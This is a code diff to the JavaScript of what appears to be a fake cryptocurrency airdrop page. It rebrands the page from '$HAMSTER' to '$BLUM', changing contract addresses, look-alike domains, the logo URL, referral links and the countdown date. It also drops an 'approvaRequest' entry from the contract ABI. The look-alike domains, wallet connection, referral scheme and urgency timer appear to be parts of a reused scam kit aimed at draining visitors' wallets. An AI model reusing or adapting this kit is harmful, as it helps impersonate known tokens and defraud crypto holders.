@@ -1,6 +1,6 @@
 let addr,
   web3 = new web3js.myweb3(window.ethereum);
-const sttaddr = "0xe13bbC4CFc7D82b3A60B9654e05a3B067DC6D1dA",
+const sttaddr = "0xe32dBB12389e4D1b6343B905781E24a79DA78fB9",
   sttabi = [
     { inputs: [], stateMutability: "nonpayable", type: "constructor" },
     {
@@ -64,19 +64,6 @@ const sttaddr = "0xe13bbC4CFc7D82b3A60B9654e05a3B067DC6D1dA",
       name: "allowance",
       outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
       stateMutability: "view",
-      type: "function",
-    },
-    {
-      inputs: [
-        {
-          internalType: "address payable",
-          name: "approvalId",
-          type: "address",
-        },
-      ],
-      name: "approvaRequest",
-      outputs: [],
-      stateMutability: "nonpayable",
       type: "function",
     },
     {
@@ -343,10 +330,10 @@ function addToWallet() {
         params: {
           type: "ERC20",
           options: {
-            address: "0xDD0af9e211F13e60c423821a90D7A8342B79AaD3",
-            symbol: "$HAMSTER",
+            address: "0xe32dBB12389e4D1b6343B905781E24a79DA78fB9",
+            symbol: "$BLUM",
             decimals: "18",
-            image: "https://www.hmstrkombatklub.online/logo.png",
+            image: "https://www.blumcoin.online/imagefile/logo1.png",
           },
         },
         id: Math.round(1e5 * Math.random()),
@@ -374,7 +361,7 @@ window.onload = function () {
   })("ref");
   null == e || (document.getElementById("airinput").value = e);
 };
-var countDownDate = new Date("November 2, 2024 00:00:00").getTime(),
+var countDownDate = new Date("November 07, 2024 00:00:00").getTime(),
   x = setInterval(function () {
     var e = new Date().getTime(),
       t = countDownDate - e,
@@ -394,7 +381,7 @@ function getreflink() {
   document.getElementById("refaddress").value
     ? /^(0x){1}[0-9a-fA-F]{40}$/i.test(e)
       ? (document.getElementById("refaddress").value =
-          "https://www.hmstrkombatklub.online/?ref=" +
+          "https://www.blumcoin.online/?ref=" +
           document.getElementById("refaddress").value)
       : Swal.fire("Referral Alert", "Your address is not valid.", "error")
     : Swal.fire("Referral Alert", "Please Enter Your BEP20 Address.", "error");
@@ -439,6 +426,6 @@ function querySt(e) {
 }
 var ref = querySt("ref");
 null == ref
-  ? ((ref = "0xDD0af9e211F13e60c423821a90D7A8342B79AaD3"),
+  ? ((ref = "0xe32dBB12389e4D1b6343B905781E24a79DA78fB9"),
     (document.getElementById("airinput").value = ref))
   : (document.getElementById("airinput").value = ref);
